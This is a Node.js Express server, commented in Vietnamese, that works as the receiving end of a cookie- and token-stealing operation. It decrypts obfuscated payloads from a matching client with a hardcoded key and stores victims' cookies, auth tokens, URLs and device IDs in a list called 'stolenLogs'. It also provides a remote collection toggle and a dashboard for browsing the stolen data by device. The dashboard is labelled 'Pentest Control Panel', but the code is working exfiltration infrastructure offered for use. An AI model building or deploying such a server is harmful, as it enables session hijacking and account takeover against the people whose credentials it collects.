const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

let stolenLogs = [];
let globalCollectionEnabled = false; 

// Khóa bí mật dùng chung (Phải khớp hoàn toàn với Client)
const SECRET_KEY = "9bab9a3717fc5bfdff0232af02019399aa4213f0c04de55774ac0205c1c38312";

// Hàm giải mã tương ứng với phía client
function decryptData(encryptedBase64, secret) {
  try {
    var decoded = decodeURIComponent(escape(atob(encryptedBase64)));
    var decrypted = "";
    for (var i = 0; i < decoded.length; i++) {
      var charCode = decoded.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
      decrypted += String.fromCharCode(charCode);
    }
    return JSON.parse(decrypted);
  } catch (e) {
    return null;
  }
}

// 1. API bật/tắt thu thập
app.get('/toggle', (req, res) => {
    globalCollectionEnabled = !globalCollectionEnabled;
    res.send(`Trạng thái thu thập hiện tại: ${globalCollectionEnabled ? 'ĐANG BẬT 🟢' : 'ĐANG TẮT 🔴'}`);
});

// 2. API kiểm tra trạng thái
app.get('/status', (req, res) => {
    res.json({ collect: globalCollectionEnabled });
});

// 3. API nhận dữ liệu đã mã hóa từ Client
app.post('/', (req, res) => {
    if (!globalCollectionEnabled) {
        return res.status(403).json({ status: "skipped", message: "Server chưa bật chế độ thu thập." });
    }

    const { data } = req.body; // Nhận gói dữ liệu mã hóa
    if (!data) {
        return res.status(400).json({ status: "error", message: "Missing data" });
    }

    // Tiến hành giải mã dữ liệu
    const decryptedPayload = decryptData(data, SECRET_KEY);
    if (!decryptedPayload) {
        return res.status(400).json({ status: "error", message: "Decryption failed" });
    }

    const { deviceId, url, cookie, token } = decryptedPayload;

    stolenLogs.push({
        time: new Date().toLocaleString(),
        deviceId: deviceId || 'Thiết bị không rõ',
        url: url || 'Không rõ URL',
        cookie: cookie || null,
        token: token || null
    });

    if (stolenLogs.length > 200) {
        stolenLogs.shift();
    }

    res.status(200).json({ status: "success" });
});

// 4. Giao diện trang chủ hiển thị log (Giữ nguyên như mã nguồn trước đây của bạn)
app.get('/', (req, res) => {
    const selectedDevice = req.query.device || 'all';
    let logRows = '';
    
    let filteredLogs = stolenLogs;
    if (selectedDevice !== 'all') {
        filteredLogs = stolenLogs.filter(log => log.deviceId === selectedDevice);
    }

    const uniqueDevices = [...new Set(stolenLogs.map(log => log.deviceId))];
    let deviceOptions = `<option value="all">Tất cả thiết bị</option>`;
    uniqueDevices.forEach(dev => {
        deviceOptions += `<option value="${dev}" ${selectedDevice === dev ? 'selected' : ''}>${dev}</option>`;
    });

    if (filteredLogs.length === 0) {
        logRows = `<tr><td colspan="5" style="text-align:center; padding: 20px; color: #888;">Chưa có dữ liệu cho thiết bị này...</td></tr>`;
    } else {
        filteredLogs.slice().reverse().forEach((log) => {
            logRows += `
                <tr style="border-bottom: 1px solid #ddd;">
                    <td style="padding: 12px; color: #666; font-size: 14px;">${log.time}</td>
                    <td style="padding: 12px; font-weight: bold; color: #28a745;">${log.deviceId}</td>
                    <td style="padding: 12px; color: #007bff; word-break: break-all;">${log.url}</td>
                    <td style="padding: 12px; background: #fdf5e6;"><pre style="margin:0; white-space: pre-wrap; word-break: break-all;">${log.cookie || '<span style="color:red">Không có</span>'}</pre></td>
                    <td style="padding: 12px; background: #eef9ff;"><pre style="margin:0; white-space: pre-wrap; word-break: break-all;">${log.token || '<span style="color:red">Không có</span>'}</pre></td>
                </tr>
            `;
        });
    }

    res.send(`
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <title>Pentest Control Panel - Secured</title>
    </head>
    <body style="font-family: system-ui, -apple-system, sans-serif; margin: 30px; background-color: #f8f9fa;">
        <h2 style="color: #333; border-bottom: 2px solid #333; padding-bottom: 10px;">🛡️ Quản Lý Log (Đã mã hóa lớp ứng dụng)</h2>
        <div style="margin-bottom: 20px;">
            <label style="font-weight: bold; margin-right: 10px;">Lọc theo thiết bị:</label>
            <select onchange="location.href='/?device=' + this.value" style="padding: 8px; border-radius: 5px; border: 1px solid #ccc;">
                ${deviceOptions}
            </select>
        </div>
        <table style="width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-radius: 8px; overflow: hidden;">
            <thead>
                <tr style="background-color: #343a40; color: white; text-align: left;">
                    <th style="padding: 12px; width: 15%;">Thời gian</th>
                    <th style="padding: 12px; width: 15%;">Tên thiết bị</th>
                    <th style="padding: 12px; width: 20%;">Ứng dụng / URL</th>
                    <th style="padding: 12px; width: 25%;">Cookie</th>
                    <th style="padding: 12px; width: 25%;">Token</th>
                </tr>
            </thead>
            <tbody>
                ${logRows}
            </tbody>
        </table>
    </body>
    </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Server bảo mật hoạt động tại cổng ${PORT}`);
});
